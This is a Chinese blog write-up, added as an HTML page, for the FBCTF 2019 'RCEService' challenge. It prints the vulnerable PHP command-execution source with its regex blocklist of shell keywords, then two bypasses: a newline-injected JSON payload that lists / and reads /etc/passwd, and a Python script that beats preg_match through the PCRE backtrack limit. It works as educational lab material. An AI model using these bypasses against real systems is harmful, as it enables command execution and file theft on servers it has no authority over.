@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>FBCTF 2019 RCEService(pcre_match回溯) | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">FBCTF 2019 RCEService(pcre_match回溯)</h2>
+            <div class="post-date">2020-01-05</div>
+            
+            <div class="post-content">
+              <p>源码：</p>
+<!-- more -->
+<pre><code>&lt;?php
+
+putenv('PATH=/home/rceservice/jail');
+
+if (isset($_REQUEST['cmd'])) {
+  $json = $_REQUEST['cmd'];
+
+  if (!is_string($json)) {
+    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';
+  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
+    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';
+  } else {
+    echo 'Attempting to run command:&lt;br/&gt;';
+    $cmd = json_decode($json, true)['cmd'];
+    if ($cmd !== NULL) {
+      system($cmd);
+    } else {
+      echo 'Invalid input';
+    }
+    echo '&lt;br/&gt;&lt;br/&gt;';
+  }
+}
+?&gt;
+</code></pre>
+<p>主页是这样的。要输入一个以JSON形式的命令。。<br>
+一开始单纯的以为就是json_encode(&quot;ls&quot;)这样。看了writeup才知道是json_encode(array(&quot;cmd&quot;=&gt;&quot;ls&quot;));<br>
+<img src="https://guokeya.github.io/post-images/1578220584747.png" alt="" loading="lazy"><br>
+可以执行ls命令。其他都会被拦截。<br>
+<img src="https://guokeya.github.io/post-images/1578220746222.png" alt="" loading="lazy"><br>
+<strong>方法一</strong><br>
+preg_match只匹配第一行。当有换行符的时候就不会匹配<br>
+那么我们可以构造一个包含换行符的payload如下</p>
+<pre><code>{                       //匹配这行
+    &quot;cmd&quot;：&quot;ls&quot;
+}
+</code></pre>
+<p><code>{%0a&quot;cmd&quot;:&quot;ls /&quot;%0a}</code><br>
+<img src="https://guokeya.github.io/post-images/1578221126119.png" alt="" loading="lazy"><br>
+根目录没flag。一般就是内网。配置文件。家目录。passwd这种敏感文件<br>
+看下passwd，发现没回显。试试/bin/cat<br>
+<img src="https://guokeya.github.io/post-images/1578221235070.png" alt="" loading="lazy"><br>
+有一个rceserver用户。看下家目录<br>
+<img src="https://guokeya.github.io/post-images/1578221280663.png" alt="" loading="lazy"><br>
+接下来读取就好了<br>
+<strong>方法二</strong><br>
+用P牛的利用PCRE回溯次数限制绕过某些安全限制<br>
+<code>https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</code><br>
+PHP为了防止DOS攻击。给pcre设置了一个回溯上限。默认是100万<br>
+<code>var_dump(ini_get('pcre.backtrack_limit'))</code><br>
+当待匹配的字符串超过100W，函数就会返回False。也就没未匹配到字符。<br>
+那么就可以绕过判断执行恶意代码<br>
+exp如下：</p>
+<pre><code>import requests
+payload = '{&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;' + &quot;a&quot;*(1000000) + '&quot;}'
+res = requests.post(&quot;http://f0b3a32e-1633-47fc-b006-ec46a6cfc17e.node3.buuoj.cn/&quot;, data={&quot;cmd&quot;:payload})
+print(res.text)
+</code></pre>
+<p>这里有个坑。由于是黑盒测试。当我在框内输入值。后来出现在URL中。我觉得这是个GET传参。<br>
+就写了个GET传参的EXP。结果返回413实体太大<br>
+看了源码才知道程序执行流程如下：</p>
+<pre><code>接收cmd的值。必须是json格式
+preg_match匹配
+取出jsondecode值中的cmd
+执行命令
+</code></pre>
+<p>这也就是为什么我们exp中。需要把填充的值也变成json格式<br>
+就是为了让json正常解析。然后获取cmd的值</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/XSd-6afAR/">
+                  <h3 class="post-title">
+                    [CISCN/NESTCTF]Love Math 命令执行
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
